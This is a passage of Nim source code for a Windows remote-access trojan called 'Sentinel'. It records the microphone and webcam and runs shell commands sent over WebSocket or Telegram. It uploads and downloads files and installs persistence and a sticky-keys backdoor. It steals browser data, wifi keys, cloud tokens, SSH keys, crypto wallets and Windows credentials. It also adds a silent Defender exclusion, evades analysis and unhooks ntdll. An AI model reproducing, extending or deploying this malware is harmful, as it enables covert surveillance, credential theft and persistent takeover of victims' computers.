      fmt.nChannels        = WORD(channels)
      fmt.nSamplesPerSec   = DWORD(sampleRate)
      fmt.nAvgBytesPerSec  = DWORD(bytesPerSec)
      fmt.nBlockAlign      = WORD(bytesPerSample)
      fmt.wBitsPerSample   = WORD(bitsPerSample)
      fmt.cbSize           = 0

      var hwi: SW_HWAVEIN = 0
      let rc = waveInOpen(addr hwi, SW_WAVE_MAPPER, addr fmt, 0, 0,
                          DWORD(SURV_CALLBACK_NULL))
      if rc != DWORD(SURV_MMSYSERR_NOERROR):
        return (false, "", "[!] mic: waveInOpen failed rc=" & $rc &
                " (no input device? in use?)")
      if hwi == 0:
        return (false, "", "[!] mic: waveInOpen returned null handle")

      var hdrs: array[SURV_MIC_BUF_COUNT, SW_WAVEHDR]
      var bufs: array[SURV_MIC_BUF_COUNT, seq[byte]]
      var openOk = true
      for i in 0..<SURV_MIC_BUF_COUNT:
        bufs[i] = newSeq[byte](bufSize)
        zeroMem(addr hdrs[i], sizeof(SW_WAVEHDR))
        hdrs[i].lpData = cast[LPSTR](addr bufs[i][0])
        hdrs[i].dwBufferLength = DWORD(bufSize)
        let rcp = waveInPrepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
        if rcp != DWORD(SURV_MMSYSERR_NOERROR):
          openOk = false
          break
        let rca = waveInAddBuffer(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
        if rca != DWORD(SURV_MMSYSERR_NOERROR):
          openOk = false
          break
      if not openOk:
        for i in 0..<SURV_MIC_BUF_COUNT:
          if bufs[i].len > 0:
            discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
        discard waveInClose(hwi)
        return (false, "", "[!] mic: setup failed")

      let rcStart = waveInStart(hwi)
      if rcStart != DWORD(SURV_MMSYSERR_NOERROR):
        for i in 0..<SURV_MIC_BUF_COUNT:
          discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
        discard waveInClose(hwi)
        return (false, "", "[!] mic: waveInStart rc=" & $rcStart)

      var pcm = newSeq[byte](pcmSize)
      var pcmFilled = 0
      var idleTicks = 0
      const MAX_IDLE_TICKS = 100
      while pcmFilled < pcmSize:
        var anyDone = false
        for i in 0..<SURV_MIC_BUF_COUNT:
          if (hdrs[i].dwFlags and DWORD(SURV_WHDR_DONE)) != 0:
            anyDone = true
            let captured = int(hdrs[i].dwBytesRecorded)
            if captured > 0 and pcmFilled < pcmSize:
              let toCopy = min(captured, pcmSize - pcmFilled)
              copyMem(addr pcm[pcmFilled], addr bufs[i][0], toCopy)
              pcmFilled += toCopy
            zeroMem(addr hdrs[i], sizeof(SW_WAVEHDR))
            hdrs[i].lpData = cast[LPSTR](addr bufs[i][0])
            hdrs[i].dwBufferLength = DWORD(bufSize)
            discard waveInAddBuffer(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
        if not anyDone:
          inc idleTicks
          if idleTicks > MAX_IDLE_TICKS: break
        else:
          idleTicks = 0
        if pcmFilled < pcmSize:
          sleep(20)

      discard waveInStop(hwi)
      discard waveInReset(hwi)
      for i in 0..<SURV_MIC_BUF_COUNT:
        discard waveInUnprepareHeader(hwi, addr hdrs[i], DWORD(sizeof(SW_WAVEHDR)))
      discard waveInClose(hwi)

      if pcmFilled == 0:
        return (false, "", "[!] mic: captured 0 bytes")
      if pcmFilled < pcm.len:
        pcm.setLen(pcmFilled)

      var wav = buildSurvWavHeader(sampleRate, channels, bitsPerSample, pcm.len)
      for b in pcm: wav.add(b)
      let path = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                 (BuildPrefix & "_mic_" & $(getTime().toUnix()) & ".wav")
      writeFile(path, cast[string](wav))
      return (true, path, "")

    proc captureCamSync(device: int): tuple[ok: bool, path, err: string] =
      const
        WM_CAP                   = WM_USER
        WM_CAP_DRIVER_CONNECT    = WM_CAP + 10
        WM_CAP_DRIVER_DISCONNECT = WM_CAP + 11
        WM_CAP_EDIT_COPY         = WM_CAP + 30
        WM_CAP_GRAB_FRAME        = WM_CAP + 60
        DEVICE_MAX = 9
      let devIdx = clamp(device, 0, DEVICE_MAX)

      if not loadAvicapOnce():
        return (false, "", "[!] cam: avicap32.dll unavailable")

      let hwnd = capCreateCaptureWindowA("cam", DWORD(WS_OVERLAPPEDWINDOW),
                                         0, 0, 320, 240, HWND(0), int32(0))
      if hwnd == 0:
        return (false, "", "[!] cam: capCreateCaptureWindowA failed")

      var connected = false
      try:
        let con = SendMessageA(hwnd, WM_CAP_DRIVER_CONNECT, WPARAM(devIdx), 0)
        if con == 0:
          return (false, "", "[!] cam: no camera at device " & $devIdx &
                  " (no webcam? in use by another app?)")
        connected = true
        discard SendMessageA(hwnd, WM_CAP_GRAB_FRAME, 0, 0)
        let ed = SendMessageA(hwnd, WM_CAP_EDIT_COPY, 0, 0)
        if ed == 0:
          return (false, "", "[!] cam: WM_CAP_EDIT_COPY failed")

        var opened = false
        for i in 0..<10:
          if OpenClipboard(0) != 0:
            opened = true
            break
          sleep(50)
        if not opened:
          return (false, "", "[!] cam: OpenClipboard failed (busy)")
        defer: CloseClipboard()

        let hDib = GetClipboardData(CF_DIB)
        if hDib == 0:
          return (false, "", "[!] cam: no DIB in clipboard")

        var bmi: BITMAPINFOHEADER
        copyMem(addr bmi, cast[ptr byte](hDib), sizeof(BITMAPINFOHEADER))
        let w = int(bmi.biWidth)
        let h = int(abs(bmi.biHeight))
        if w == 0 or h == 0:
          return (false, "", "[!] cam: driver returned empty frame")
        var pixelBytes = int(bmi.biSizeImage)
        if pixelBytes == 0:
          let bpp = int(bmi.biBitCount)
          if bpp == 0:
            return (false, "", "[!] cam: driver returned bpp=0")
          pixelBytes = ((w * bpp + 31) div 32) * 4 * h
        let compression = int(bmi.biCompression)
        let extraHdr = if compression == 3: 12 else: 0
        let actualDibSize = sizeof(BITMAPINFOHEADER) + pixelBytes + extraHdr
        let fileSize = 14 + actualDibSize

        var bmp = newSeqOfCap[byte](fileSize)
        bmp.add(0x42); bmp.add(0x4D)
        proc putU32(b: var seq[byte], v: int32) =
          b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
          b.add(byte((v shr 16) and 0xFF)); b.add(byte((v shr 24) and 0xFF))
        proc putU16(b: var seq[byte], v: int16) =
          b.add(byte(v and 0xFF)); b.add(byte((v shr 8) and 0xFF))
        putU32(bmp, int32(fileSize))
        putU16(bmp, int16(0))
        putU16(bmp, int16(0))
        putU32(bmp, int32(14 + sizeof(BITMAPINFOHEADER) + extraHdr))
        let src = cast[ptr UncheckedArray[byte]](hDib)
        var copied = 0
        while copied < actualDibSize:
          let chunk = min(4096, actualDibSize - copied)
          for j in 0..<chunk: bmp.add(byte(src[copied + j]))
          inc copied, chunk

        let path = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                   (BuildPrefix & "_cam_" & $(getTime().toUnix()) & ".bmp")
        writeFile(path, cast[string](bmp))
        return (true, path, $w & "x" & $h)
      finally:
        if connected:
          discard SendMessageA(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
        DestroyWindow(hwnd)

# =============================================================================
# WS TRANSPORT
# =============================================================================
when defined(c2_ws) or defined(c2_both):
  when defined(windows):
    var pinnedCertPath: string = ""

    when defined(tls_pin):
      proc ensurePinnedCertFile(): string =
        if pinnedCertPath.len > 0:
          if fileExists(pinnedCertPath): return pinnedCertPath
        if PINNED_CERT_PEM.len == 0: return ""
        let tmpDir = getEnv("TEMP", expandTilde("~"))
        let path = tmpDir / ("svc-cache-" & $getCurrentProcessId() & ".pem")
        try:
          let f = open(path, fmWrite)
          defer: f.close()
          f.write(PINNED_CERT_PEM)
          pinnedCertPath = path
          return path
        except: return ""

    proc connectPinnedWebSocket(url: string): Future[WebSocket] {.async.} =
      when defined(tls_pin):
        let uri = parseUri(url)
        let isWss = uri.scheme.toLowerAscii() == "wss"
        if not isWss or PINNED_CERT_PEM.len == 0:
          return await newWebSocket(url)
        let port = if uri.port.len > 0: Port(parseInt(uri.port)) else: Port(443)
        let host = if uri.hostname.len > 0: uri.hostname else: "127.0.0.1"
        let sock = newAsyncSocket()
        await sock.connect(host, port)
        let certPath = ensurePinnedCertFile()
        if certPath.len == 0:
          sock.close()
          raise newException(IOError, "pin: cert write failed")
        let ctx = newContext(verifyMode = CVerifyPeer, caFile = certPath)
        if ctx == nil:
          sock.close()
          raise newException(IOError, "pin: SSL context create failed")
        wrapConnectedSocket(ctx, sock, handshakeAsClient, host)
        var secStr = newString(16)
        for i in 0 ..< secStr.len: secStr[i] = char rand(255)
        let secKey = base64.encode(secStr)
        let pathPart = if uri.path.len > 0: uri.path else: "/"
        let req =
          "GET " & pathPart & " HTTP/1.1\r\n" &
          "Host: " & host & (if uri.port.len > 0: ":" & uri.port else: "") & "\r\n" &
          "Upgrade: websocket\r\n" &
          "Connection: Upgrade\r\n" &
          "Sec-WebSocket-Version: 13\r\n" &
          "Sec-WebSocket-Key: " & secKey & "\r\n\r\n"
        await sock.send(req)
        var headers = ""
        while not (contains(headers, "\r\n\r\n")):
          let chunk = await sock.recv(1)
          if chunk.len == 0:
            sock.close()
            raise newException(IOError, "pin: upgrade response EOF")
          headers.add(chunk)
          if headers.len > 8192:
            sock.close()
            raise newException(IOError, "pin: upgrade response too large")
        let statusLine = headers.split("\r\n", 1)[0]
        if "101" notin statusLine:
          sock.close()
          raise newException(IOError, "pin: upgrade failed: " & statusLine)
        let upgrade = headers.toLowerAscii
        if "upgrade: websocket" notin upgrade:
          sock.close()
          raise newException(IOError, "pin: not a WebSocket upgrade")
        var ws: WebSocket
        ws = WebSocket()
        ws.masked = true
        ws.tcpSocket = sock
        ws.readyState = Open
        return ws
      else:
        return await newWebSocket(url)

  proc downloadFile(filepath: string,
                   sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                  ): Future[void] {.async.} =
    const chunkSize = 524288
    if not fileExists(filepath):
      await sendToC2(%* {"type": "output", "data": "[!] Not found: " & filepath})
      return
    let total = (getFileSize(filepath) + chunkSize - 1) div chunkSize
    let f = open(filepath, fmRead)
    defer: f.close()
    var buf = newSeq[byte](chunkSize)
    var idx = 0
    while true:
      let n = f.readBuffer(addr buf[0], chunkSize)
      if n == 0 and idx > 0: break
      await sendToC2(%* {
        "type": "file_chunk", "filepath": filepath, "chunk_index": idx,
        "total_chunks": total, "data": base64.encode(buf[0..<n]),
        "last_chunk": idx >= total - 1
      })
      inc idx
      if n < chunkSize: break

  proc uploadFile(remotePath, dataB64: string,
                 sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                ): Future[void] {.async.} =
    try:
      let data = base64.decode(dataB64)
      createDir(remotePath.parentDir)
      let f = open(remotePath, fmAppend)
      defer: f.close()
      discard f.writeBuffer(addr data[0], data.len)
      await sendToC2(%* {"type": "output", "data":
        "[+] uploaded " & $data.len & " bytes to " & remotePath})
    except CatchableError as e:
      await sendToC2(%* {"type": "output", "data": "[!] upload: " & e.msg})

  proc takeScreenshot(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                     ): Future[JsonNode] {.async.} =
    let (ok, path, err) = takeScreenshotBmp()
    if not ok:
      return %* {"type": "output", "data": "[!] " & err}
    let data = readFile(path)
    const chunkSize = 524288
    let total = (data.len + chunkSize - 1) div chunkSize
    var idx = 0
    var off = 0
    while off < data.len:
      let n = min(chunkSize, data.len - off)
      await sendToC2(%* {
        "type": "file_chunk", "filepath": path, "chunk_index": idx,
        "total_chunks": total, "data": base64.encode(data[off..<off+n]),
        "last_chunk": off + n >= data.len
      })
      inc idx
      off += n
    try: removeFile(path) except: discard
    return %* {"type": "output", "data": "[+] screenshot sent (" & $data.len & " B)"}

  const CMD_DEDUP_WINDOW = 64
  var seenCmdIds: array[CMD_DEDUP_WINDOW, int64]
  var seenCmdIdx = 0

  proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
                     sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                     meta: ref MetaData): Future[void] {.async.} =
    let cid = (if cmd.hasKey("cid"): cmd["cid"].getInt() else: 0)
    if cid > 0:
      for i in 0..<CMD_DEDUP_WINDOW:
        if seenCmdIds[i] == cid: return
      seenCmdIds[seenCmdIdx] = cid
      seenCmdIdx = (seenCmdIdx + 1) mod CMD_DEDUP_WINDOW

    let cmdName = (if cmd.hasKey("cmd"): cmd["cmd"].getStr() else: "")
    let cmdArgs = (if cmd.hasKey("args"): cmd["args"].getStr() else: "")

    case cmdName
    of "shell":
      let (outp, code) = executeShell(if cmdArgs.len > 0: cmdArgs else: "whoami")
      await sendToC2(%* {"type": "output", "data": outp, "exit_code": code})
    of "download":
      await downloadFile(cmdArgs, sendToC2)
    of "upload":
      let remote = (if cmd.hasKey("path"): cmd["path"].getStr else: cmdArgs)
      let b64 = (if cmd.hasKey("data"): cmd["data"].getStr else: "")
      await uploadFile(remote, b64, sendToC2)
    of "screenshot":
      await sendToC2(await takeScreenshot(sendToC2))
    of "ps":
      await sendToC2(processList())
    of "clip":
      await sendToC2(getClipboard())
    of "find":
      await sendToC2(fileSearch(cmdArgs))
    of "persist":
      establishPersistence()
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] persist ok"})
    of "stickykeys":
      await sendToC2(%* {"type": "output", "data": installStickyKeys()})
    of "cleanup":
      selfCleanup()
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] cleanup ok"})
    of "kill":
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] shutting down"})
      selfCleanup()
      quit(0)
    of "panic":
      when defined(windows):
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & " sentinel] panic: wiping"})
        panicWipe()
      else: panicWipe()
    of "killdate":
      let ts = (if cmdArgs.len > 0: parseInt(cmdArgs) else: 0)
      meta.killDate = ts
      saveMeta(meta[])
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] killdate=" & $ts})
    of "sleep":
      let m = (if cmdArgs.len > 0: parseInt(cmdArgs) else: 0)
      meta.sleepMin = m
      saveMeta(meta[])
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] sleep=" & $m & "m"})
    of "exfil":
      when defined(windows):
        let kind = cmdArgs
        let result = case kind
          of "browser":  exfilBrowserData()
          of "wifi":     exfilWifiPasswords()
          of "cloud":    exfilCloudTokens()
          of "ssh":      exfilSshKeys()
          of "media":    exfilMediaFiles()
          of "wallet":   exfilWalletData()
          of "recent":   exfilRecentFiles()
          of "wincreds": exfilWinCreds()
          else: %* {"type": "output", "data": "[!] exfil: unknown kind (browser|wifi|cloud|ssh|media|wallet|recent|wincreds)"}
        await sendToC2(result)
    of "recon":
      when defined(windows):
        let kind = cmdArgs
        let result = case kind
          of "edr":      reconEdrAv()
          of "shares":   reconNetShares()
          of "software": reconSoftware()
          of "usb":      reconUsbHistory()
          of "tasks":    reconScheduledTasks()
          else: %* {"type": "output", "data": "[!] recon: unknown kind (edr|shares|software|usb|tasks)"}
        await sendToC2(result)
    of "tg":
      if telegramEnabled():
        let ok = sendToTg("[" & BuildPrefix & "] " & cmdArgs)
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] tg: " & (if ok: "ok" else: "fail")})
      else:
        await sendToC2(%* {"type": "output", "data": "[!] tg: telegram not configured"})
    of "hook":
      if webhookEnabled():
        let ok = sendToHook("[" & BuildPrefix & "] " & cmdArgs)
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] hook: " & (if ok: "ok" else: "fail")})
      else:
        await sendToC2(%* {"type": "output", "data": "[!] hook: webhook not configured"})
    of "autodrive":
      when defined(windows):
        if cmdArgs == "start":
          if autoDriveRunning:
            await sendToC2(%* {"type": "output", "data": "[!] auto-drive already running"})
            return
          initAutoDrive()
          asyncCheck autoDriveLoop(sendToC2)
          await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] auto-drive started"})
        elif cmdArgs == "stop":
          if not autoDriveRunning:
            await sendToC2(%* {"type": "output", "data": "[!] auto-drive not running"})
            return
          autoDriveRunning = false
          await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] auto-drive stopped"})
        else:
          await sendToC2(%* {"type": "output", "data": "[!] usage: autodrive start|stop"})
    of "ping": discard
    else:
      let handled = await hardeningCommandsWs(cmdName, cmdArgs, sendToC2)
      if not handled:
        await sendToC2(%* {"type": "output", "data": "[!] unknown: " & cmdName})

  proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.} =
    var ws: WebSocket = nil
    try:
      ws = await connectPinnedWebSocket(url)
    except: return

    try:
      let info = getSystemInfo()
      let payload = $info
      let ourNonce: array[16, byte] = block:
        var n: array[16, byte]
        discard randomBytes(addr n[0], 16)
        n
      let anB64 = base64.encode(ourNonce)
      let hmacHexVal = hmacHex(agentSecret(), payload)
      let regFrame = $ %* {"p": payload, "h": hmacHexVal, "an": anB64}
      try: await ws.send(regFrame)
      except: return

      let recvFut = ws.receiveStrPacket()
      let ok = await withTimeout(recvFut, 10000)
      if not ok: return
      let ackBlob = recvFut.read
      if ackBlob.len == 0: return
      let ack = parseJson(ackBlob)
      if (if ack.hasKey("status"): ack["status"].getStr() else: "") != "registered":
        return
      sc.agentId = ack["agent_id"].getStr
      let snB64 = ack["sn"].getStr
      let sn = hexToBytes(snB64)
      if sn.len != 16: return
      for i in 0..<16: sc.peerNonce[i] = sn[i]
      sc.key = deriveSessionKey(agentSecret(), sn, ourNonce)
      echo "[" & BuildPrefix & "] registered as ", sc.agentId
      meta.lastContact = getTime().toUnix
      try: saveMeta(meta[]) except: discard
      if telegramEnabled():
        discard sendToTg("[" & BuildPrefix & " online] " & sc.agentId & " " &
                         getEnv("COMPUTERNAME", "?") & "/" & getEnv("USERNAME", "?"))
      if webhookEnabled():
        discard sendToHook("[" & BuildPrefix & " online] " & sc.agentId)

      if not fileExists(META_FILE) and AUTO_PERSIST:
        try: establishPersistence() except: agentLog("persist failed: " & getCurrentExceptionMsg())

      when defined(windows):
        if ADD_DEFENDER_EXCLUSION and not fileExists(META_FILE & ".excl_done"):
          try:
            let installPath = if meta.copyPath.len > 0: meta.copyPath
                              else: getAppFilename()
            let installDir = installPath.parentDir
            var key: HKEY
            let exclPath = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, newWideCString(exclPath),
                             0, KEY_SET_VALUE or KEY_WOW64_64KEY, addr key) == ERROR_SUCCESS:
              let wName = newWideCString(installDir)
              let wZero = newWideCString("0")
              discard RegSetValueExW(key, wName, 0, REG_SZ,
                                     cast[ptr BYTE](wZero[0].addr),
                                     DWORD(2 * 2))
              discard RegCloseKey(key)
            writeFile(META_FILE & ".excl_done", "1")
          except: discard

      var closed = false
      proc wsSendToC2(msg: JsonNode) {.async, gcsafe.} =
        if closed: return
        try: await ws.send(cast[string](encryptFrame(sc, $msg)))
        except: closed = true

      proc receiverTask() {.async, gcsafe.} =
        while not closed:
          {.cast(gcsafe).}:
            try:
              let plain = await ws.receiveStrPacket()
              if plain.len == 0: closed = true; return
              let dec = decryptFrame(sc, cast[seq[byte]](plain))
              if dec.len == 0: continue
              try:
                let c = parseJson(dec)
                await handleCommand(sc, c, wsSendToC2, meta)
              except CatchableError as e: agentLog("handler: " & e.msg)
            except: closed = true; return

      asyncCheck receiverTask()
      var lastBeacon = getTime().toUnix
      while not closed:
        ekkoSleep(BEACON_INTERVAL * 1000)
        if closed: break
        if getTime().toUnix - lastBeacon >= BEACON_INTERVAL:
          try: await ws.send(cast[string](encryptFrame(sc, $ %* {"type": "heartbeat"})))
          except: closed = true; break
          lastBeacon = getTime().toUnix
      closed = true
    except CatchableError as e:
      agentLog("connectAndRun: " & e.msg)
    finally:
      try: ws.close() except: discard

  proc computeDelay(attempt: int): float =
    let base = min(RECONNECT_BASE_DELAY * pow(2.0, attempt.float), RECONNECT_MAX_DELAY)
    max(1.0, base + base * RECONNECT_JITTER * (rand(1.0) * 2 - 1))

  proc agentLoop() {.async.} =
    randomize()
    when defined(windows):
      if not acquireMutex():
        agentLog("another instance owns the mutex, exiting")
        return
      if antiAnalysisCheck():
        agentLog("analysis environment detected, bailing out")
        return
      let evasionStatus = applyEvasion()
      discard unhookNtdll()
      collectEncryptRegions()
      agentLog("evasion: " & evasionStatus)
    var meta = new(MetaData)
    meta[] = loadMeta()
    var c2Idx = 0
    var fails = 0
    if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
      selfCleanup()
      return
    when defined(windows):
      if DEAD_MAN_SECS > 0 and meta.lastContact > 0:
        let elapsed = getTime().toUnix - meta.lastContact
        if elapsed >= DEAD_MAN_SECS:
          agentLog("dead-man trigger, self-destructing")
          panicWipe()
    if telegramEnabled():
      discard sendToTg("[" & BuildPrefix & " boot] " & getEnv("COMPUTERNAME", "?") & "/" & getEnv("USERNAME", "?"))
    if webhookEnabled():
      discard sendToHook("[" & BuildPrefix & " boot] " & getEnv("COMPUTERNAME", "?") & "/" & getEnv("USERNAME", "?"))
    let initialJitterMs = rand(25000) + 5000
    await sleepAsync(initialJitterMs)
    while true:
      if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
        selfCleanup()
        return
      let sc = SessionCrypto()
      let url = C2_URLS_RESOLVED[c2Idx mod C2_URLS_RESOLVED.len]
      await connectAndRun(sc, url, meta)
      inc c2Idx
      let sleepMs = meta.sleepMin * 60 * 1000
      let baseMs = int(computeDelay(fails) * 1000)
      let wait = max(baseMs, sleepMs)
      await sleepAsync(wait)
      inc fails

# =============================================================================
# TELEGRAM TRANSPORT
# =============================================================================
when defined(c2_tg):
  const S_HELP_HEADER = encodeObf("Sentinel - available commands:\n")
  const S_HELP_BODY = encodeObf(
    "/cmd <cmd>            run shell command (timeout 120s)\n" &
    "/upload <path>        upload file from target (Telegram document)\n" &
    "/dl <file_id>         download file by Telegram file_id\n" &
    "/sysinfo              host, user, OS, network info\n" &
    "/screenshot           capture primary desktop\n" &
    "/ps                   process list (tasklist /v)\n" &
    "/kill <pid>           kill process\n" &
    "/ls [path]            list directory (default .)\n" &
    "/cat <file>           read first 4 KB of file\n" &
    "/cd <path>            change working directory\n" &
    "/pwd                  print working directory\n" &
    "/whoami               current user@host\n" &
    "/env [name]           env var (or all)\n" &
    "/drives               list logical drives\n" &
    "/ipconfig             ipconfig /all\n" &
    "/wifi                 saved wifi profiles + cleartext keys\n" &
    "/av                   check for AV/EDR processes\n" &
    "/persist              install Run key + scheduled task + stickykeys\n" &
    "/stickykeys           install sticky-keys backdoor (admin)\n" &
    "/cleanup              remove all persistence (agent stays alive)\n" &
    "/watch [start N | count N [sec] | stop]   periodic screenshots\n" &
    "/selfdestruct         remove agent + all persistence + exit\n" &
    "/sleep <seconds>      quiet mode N seconds (only /wake honored)\n" &
    "/wake                 end quiet mode early\n" &
    "/killdate <unix_ts>   self-destruct deadline (/killdate off clears)\n" &
    "/exit                 kill the agent (persistence stays)\n" &
    "/status               health check (uptime, persistence, last poll)\n" &
    "/find <dir>*<glob>    recursive file search (capped 500)\n" &
    "/clip                 clipboard snapshot\n" &
    "/keys start|stop      keylogger (sends captures as documents)\n" &
    "/mic <seconds>        record mic audio, send as WAV (max 120)\n" &
    "/cam                  capture from default webcam as document\n" &
    "/exfil browser        stage Chrome/Edge SQLite + Local State\n" &
    "/exfil wifi           saved wifi profiles (cleartext keys)\n" &
    "/exfil cloud          AWS / GCP / Azure / Git / Kube creds\n" &
    "/exfil ssh            %USERPROFILE%\\.ssh contents\n" &
    "/exfil recent         jump lists\n" &
    "/exfil wincreds       vaultcmd /listcreds\n" &
    "/exfil media          existing audio/video files (cap 500 MB)\n" &
    "/exfil wallet         ETH keystore / BTC wallet.dat / MetaMask")

  proc cmdHelp(): string =
    return obfDec(S_HELP_HEADER) & obfDec(S_HELP_BODY)

  proc cmdExec(command: string): string =
    if command.strip().len == 0: return "(empty command)"
    try:
      let (outp, exitCode) = execHidden("cmd.exe /c " & command)
      if outp.len == 0: return "(no output, exit " & $exitCode & ")"
      return outp[0..<min(MaxOutputBytes, outp.len)]
    except CatchableError as e: return "err: " & e.msg

  proc cmdSysinfo(): string =
    var info = %* {
      "user": getEnv("USERNAME", "?"),
      "host": getEnv("COMPUTERNAME", "?"),
      "domain": getEnv("USERDOMAIN", "?"),
      "arch": getEnv("PROCESSOR_ARCHITECTURE", "?"),
      "pid": getCurrentProcessId(),
      "exe": getAppFilename(),
      "is_admin": IsUserAnAdmin() != 0,
      "cwd": getCurrentDir(),
      "variant": VARIANT_NAME,
      "transport": c2Mode,
      "version": AgentVersion
    }
    try: return $info.pretty
    except: return "err: " & getCurrentExceptionMsg()

  proc cmdLs(path: string): string =
    let p = if path.strip().len == 0: "." else: path.strip()
    try:
      var rows: seq[string] = @[]
      for kind, name in walkDir(p):
        if rows.len >= 500: break
        let full = p / name
        var size = "?"
        try:
          if kind == pcFile or kind == pcLinkToFile: size = $getFileSize(full)
          else: size = "<dir>"
        except: discard
        rows.add(size.align(14) & "  " & name)
      if rows.len == 0: return "(empty)"
      return rows.join("\n")
    except CatchableError as e: return "err: " & e.msg

  proc cmdCat(path: string): string =
    if path.len == 0: return "usage: /cat <file>"
    try:
      let data = readFile(path)
      return data[0..<min(MaxOutputBytes, data.len)]
    except CatchableError as e: return "err: " & e.msg

  proc cmdEnv(name: string): string =
    if name.len == 0:
      var lines: seq[string] = @[]
      for k, v in envPairs(): lines.add(k & "=" & v)
      let joined = lines.join("\n")
      return joined[0..<min(MaxOutputBytes, joined.len)]
    return getEnv(name, "(not set)")

  proc cmdWifi(): string =
    let ps =
      "$out = @()\n" &
      "$profiles = (netsh wlan show profiles) | " &
        "Select-String 'All User Profile' | " &
        "ForEach-Object { ($_ -split ':')[1].Trim() }\n" &
      "foreach ($p in $profiles) {\n" &
      "  $k = (netsh wlan show profile name=$p key=clear) | " &
        "Select-String 'Key Content'\n" &
      "  $key = if ($k) { ($k -split ':')[1].Trim() } else { '(no key)' }\n" &
      "  $out += ($p + ' : ' + $key)\n" &
      "}\n" &
      "$out -join ([char]10)\n"
    try:
      let (outp, _) = execHidden(psRun(ps))
      if outp.len == 0: return "(no wifi profiles)"
      return outp[0..<min(MaxOutputBytes, outp.len)]
    except CatchableError as e: return "err: " & e.msg

  proc cmdAv(): string =
    var suspectSet = initTable[string, bool]()
    for s in AvEdrProcs: suspectSet[s] = true
    try:
      let (outp, _) = execHidden("tasklist /fo csv /nh")
      var hits: seq[string] = @[]
      for line in outp.splitLines:
        if line.len == 0: continue
        let parts = line.split('"')
        if parts.len < 2: continue
        let name = parts[1].toLowerAscii
        if suspectSet.hasKey(name): hits.add(name)
      if hits.len == 0: return "no common AV/EDR detected"
      return "AV/EDR hits: " & hits.join(", ")
    except CatchableError as e: return "err: " & e.msg

  proc cmdScreenshot(): string =
    let (ok, path, err) = takeScreenshotPs()
    if not ok: return "screenshot failed: " & err
    return "@file:" & path

  var tgAgentStart = getMonoTime()
  var tgPollsTotal = 0
  var tgPollsOk = 0
  var tgLastPollOk: int64 = 0
  var tgLastPollErr = ""

  proc cmdStatus(): string =
    let uptime = (getMonoTime() - tgAgentStart).inSeconds
    let h = uptime div 3600
    let m = (uptime mod 3600) div 60
    let s = uptime mod 60
    var runkey = "?"
    var task = "?"
    var stickey = "?"
    try:
      let ps =
        "(Get-ItemProperty -Path 'HKCU:\\" & obfStr(S_PERSIST_RUN) & "' " &
        "-Name '" & PersistRunName & "' -ErrorAction SilentlyContinue) -ne $null;\n" &
        "(Get-ScheduledTask -TaskName '" & PersistTaskName & "' " &
        "-ErrorAction SilentlyContinue) -ne $null;\n" &
        "Test-Path $env:SystemRoot\\System32\\sethc.exe.bak\n"
      let (outp, _) = execHidden(psRun(ps))
      let parts = outp.splitLines
      if parts.len > 0: runkey  = (if parts[0].toLowerAscii == "true": "OK" else: "MISSING")
      if parts.len > 1: task    = (if parts[1].toLowerAscii == "true": "OK" else: "MISSING")
      if parts.len > 2: stickey = (if parts[2].toLowerAscii == "true": "OK" else: "NOT INSTALLED")
    except: discard
    let lastOkStr = if tgLastPollOk > 0'i64:
      $(getMonoTime().ticks div 1_000_000_000 - tgLastPollOk) & "s ago"
    else: "never"
    let actualExe = getAppFilename()
    let actualDir = actualExe.parentDir()
    let actualName = extractFilename(actualExe)
    return "uptime:       " & $h & "h" & $m & "m" & $s & "s\n" &
           "pid:          " & $getCurrentProcessId() & "\n" &
           "admin:        " & $(IsUserAnAdmin() != 0) & "\n" &
           "exe:          " & actualExe & "\n" &
           "install_dir:  " & actualDir & "\n" &
           "install_name: " & actualName & "\n" &
           "mutex:        " & MutexName & "\n" &
           "polls:        " & $tgPollsOk & "/" & $tgPollsTotal & " ok\n" &
           "last_poll:    " & lastOkStr & "\n" &
           "last_err:     " & (if tgLastPollErr.len > 0: tgLastPollErr else: "-") & "\n" &
           "killdate:     " & (if tgMetaKillDate > 0:
                                 fromUnix(tgMetaKillDate).format("yyyy-MM-dd HH:mm") &
                                 " (" & $(tgMetaKillDate - getTime().toUnix()) & "s)"
                               else: "not set") & "\n" &
           "sleeping:     " & (if tgSleepEpoch > 0 and getTime().toUnix() < tgSleepEpoch:
                                 $(tgSleepEpoch - getTime().toUnix()) & "s left (/wake)"
                               else: "no") & "\n" &
           "variant:      " & VARIANT_NAME & "\n" &
           "persistence:\n" &
           "  run_key:    " & runkey & "\n" &
           "  task:       " & task & "\n" &
           "  stickykeys: " & stickey

  proc cmdWatch(arg: string): string =
    let parts = arg.split(' ', 1)
    let sub  = if parts.len > 0: parts[0].strip().toLowerAscii else: ""
    let rest = if parts.len > 1: parts[1].strip() else: ""
    if sub == "":
      let shots = watchShotsTaken
